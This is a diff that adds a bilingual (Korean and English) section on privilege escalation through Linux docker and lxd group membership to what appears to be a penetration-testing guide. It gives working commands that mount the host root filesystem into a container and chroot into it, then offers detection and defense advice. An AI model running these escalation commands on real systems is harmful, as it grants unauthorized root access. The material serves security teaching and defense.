@@ -396,6 +396,30 @@ if __name__ == "__main__":
 
 ---
 
+## 6.5 Docker/LXD 그룹을 통한 권한 상승
+
+`docker` 또는 `lxd` 그룹에 속한 사용자는 sudo 권한이 없어도 사실상 root와 동등하다. 두 그룹 모두 호스트 파일시스템 전체를 마운트한 컨테이너를 직접 띄울 수 있는 소켓 접근 권한을 주기 때문이다 — 도커 데몬 자체가 root로 실행되며 그 소켓에 쓸 수 있다는 것은 root 권한 위임과 같다.
+
+```bash
+# 소속 그룹 확인
+id
+groups $USER
+
+# --- docker 그룹 악용 ---
+# 호스트의 루트 파일시스템을 컨테이너 안에 마운트하고 chroot
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# --- lxd 그룹 악용 (LXD 미설치 시 스냅으로 설치 필요할 수 있음) ---
+lxc init ubuntu:20.04 privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc -- chroot /mnt/root bash
+```
+
+**탐지/방어**: `docker`/`lxd` 그룹 멤버십은 root 권한 위임과 동일하게 취급해 최소한의 신뢰된 관리자에게만 부여한다. 소켓 접근 대신 rootless Docker나 Podman(rootless) 도입을 검토하고, 감사 로그에서 `docker run -v /:...` 같은 전체 루트 마운트 패턴과 예상 밖 계정의 `docker`/`lxc` 그룹 편입(`/etc/group` 변경, 이벤트 상 `usermod -aG docker`)을 모니터링한다.
+
+---
+
 ## 7. 참고 도구
 
 | 도구 | 용도 |
@@ -727,6 +751,30 @@ def main() -> None:
 if __name__ == "__main__":
     main()
 ```
+
+---
+
+## 6.5 Privilege Escalation via the Docker/LXD Group
+
+A user in the `docker` or `lxd` group is effectively root even without sudo rights: both groups grant socket access to launch a container that mounts the entire host filesystem — since the daemon itself runs as root, write access to its socket is equivalent to delegating root.
+
+```bash
+# Check group membership
+id
+groups $USER
+
+# --- Abusing the docker group ---
+# Mount the host's root filesystem inside a container and chroot into it
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# --- Abusing the lxd group (LXD may need to be installed via snap first) ---
+lxc init ubuntu:20.04 privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc -- chroot /mnt/root bash
+```
+
+**Detection/Defense**: Treat `docker`/`lxd` group membership as equivalent to root delegation and grant it only to a minimal set of trusted admins. Consider rootless Docker or rootless Podman instead of raw socket access, and monitor audit logs for full-root-mount patterns like `docker run -v /:...` as well as unexpected accounts being added to the `docker`/`lxc` group (`/etc/group` changes, `usermod -aG docker` events).
 
 ---
 
